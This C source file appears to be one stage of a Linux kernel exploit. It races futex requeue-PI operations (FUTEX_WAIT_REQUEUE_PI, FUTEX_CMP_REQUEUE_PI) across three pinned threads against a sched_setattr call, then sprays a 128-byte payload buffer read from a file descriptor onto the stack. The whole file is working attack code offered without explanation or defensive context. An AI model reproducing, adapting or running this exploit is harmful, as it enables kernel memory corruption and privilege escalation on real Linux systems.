#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#include "kernelsnitch/utils.h"

#define WAITER_WAIT_SEC     5
#define CONSUMER_DELAY_USEC 15000
#define CONSUMER_NICE       19
#define CONSUMER_CALLS      1

#define EXP_BUFFER_BYTES 128
#define EXP_BUFFER_WORDS (EXP_BUFFER_BYTES / sizeof(uint64_t))

static uint32_t f_wait;
static uint32_t f_pi_target;
static uint32_t f_pi_chain;

static atomic_int g_waiter_tid;
static atomic_int g_waiter_ready;
static atomic_int g_waiter_waiting;
static atomic_int g_owner_started;
atomic_int g_consumer_go;
static atomic_int g_consumer_done;
static uint64_t g_payload_buffer[EXP_BUFFER_WORDS];

struct local_sched_attr {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t  sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime;
    uint64_t sched_deadline;
    uint64_t sched_period;
};

static long sched_setattr_tid(int tid, int nice_val) {
    struct local_sched_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.size         = sizeof(attr);
    attr.sched_policy = SCHED_BATCH;
    attr.sched_nice   = nice_val;
    return syscall(__NR_sched_setattr, tid, &attr, 0);
}

void do_stamp_stack(uint64_t *buf);

static void *waiter_thread(void *arg __attribute__((unused))) {
    pin_to_core(2);
    int tid = (int)syscall(__NR_gettid);
    atomic_store(&g_waiter_tid, tid);

    if (syscall(__NR_futex, &f_pi_chain, FUTEX_LOCK_PI, 0,
                NULL, NULL, 0) != 0) {
        pr_warning("Waiter: lock_pi chain failed errno=%d\n", errno);
        return NULL;
    }

    atomic_store(&g_waiter_ready, 1);

    while (!atomic_load(&g_owner_started))
        usleep(1000);

    struct timespec timeout;
    syscall(__NR_clock_gettime, CLOCK_MONOTONIC, &timeout);
    timeout.tv_sec += WAITER_WAIT_SEC;

    atomic_store(&g_waiter_waiting, 1);

    pr_info("Waiter: futex wait requeue pi\n");
    syscall(__NR_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
            &timeout, &f_pi_target, 0);
    pr_debug("Waiter: returned from wait requeue pi errno=%d\n",
             errno);

    syscall(__NR_futex, &f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

    do_stamp_stack(g_payload_buffer);

    while (1)
        sleep(1);

    return NULL;
}

static void *owner_thread(void *arg __attribute__((unused))) {
    if (syscall(__NR_futex, &f_pi_target, FUTEX_LOCK_PI, 0,
                NULL, NULL, 0) != 0) {
        pr_warning("Owner: lock_pi target failed errno=%d\n", errno);
        return NULL;
    }

    while (!atomic_load(&g_waiter_ready))
        usleep(1000);

    atomic_store(&g_owner_started, 1);

    pr_debug("Owner: lock_pi chain, will block\n");
    syscall(__NR_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    pr_debug("Owner: lock_pi chain acquired\n");

    while (1)
        sleep(1);
    return NULL;
}

static void *consumer_thread(void *arg __attribute__((unused))) {
    pin_to_core(3);
    int tid = 0;
    while (!(tid = atomic_load(&g_waiter_tid)))
        usleep(1000);

    while (!atomic_load(&g_consumer_go))
        ;

    usleep(CONSUMER_DELAY_USEC);

    if (!atomic_load(&g_consumer_go)) {
        pr_warning("Consumer: missed the window\n");
        return NULL;
    }

    long ret = 0;
    pr_debug("Consumer: hammering sched_setattr on TID %d\n", tid);
    for (int i = 0; i < CONSUMER_CALLS; i++) {
        ret = sched_setattr_tid(tid, (i & 1) ? CONSUMER_NICE - 1 : CONSUMER_NICE);
        usleep(60000);
    }
    pr_debug("Consumer: sched_setattr returned %ld errno=%d\n", ret, errno);

    atomic_store(&g_consumer_done, 1);

    while (1)
        sleep(1);
    return NULL;
}

int main(int argc, char **argv) {
    if (argc < 2) {
        pr_warning("Usage: %s <buffer_fd>\n", argv[0]);
        return 1;
    }

    int buf_fd = atoi(argv[1]);
    ssize_t n = pread(buf_fd, g_payload_buffer, EXP_BUFFER_BYTES, 0);
    if (n != EXP_BUFFER_BYTES) {
        pr_warning("Buffer fd %d unreadable: pread=%zd errno=%d\n",
                   buf_fd, n, errno);
        return 1;
    }

    pr_info("Stage started pid=%d\n", getpid());

    pthread_t waiter, owner, consumer;

    pthread_create(&waiter,   NULL, waiter_thread,   NULL);
    pthread_create(&owner,    NULL, owner_thread,    NULL);
    pthread_create(&consumer, NULL, consumer_thread, NULL);

    while (!atomic_load(&g_waiter_waiting) ||
           !atomic_load(&g_owner_started))
        usleep(1000);

    usleep(200000);

    pr_info("Main: futex cmp requeue pi\n");
    errno = 0;
    syscall(__NR_futex, &f_wait, FUTEX_CMP_REQUEUE_PI, 1,
            (void *)1, &f_pi_target, 0);
    pr_debug("Main: cmp requeue pi returned errno=%d\n",
             errno);

    while (!atomic_load(&g_consumer_done))
        sleep(1);

    pr_info("Main: chain complete\n");
    return 0;
}
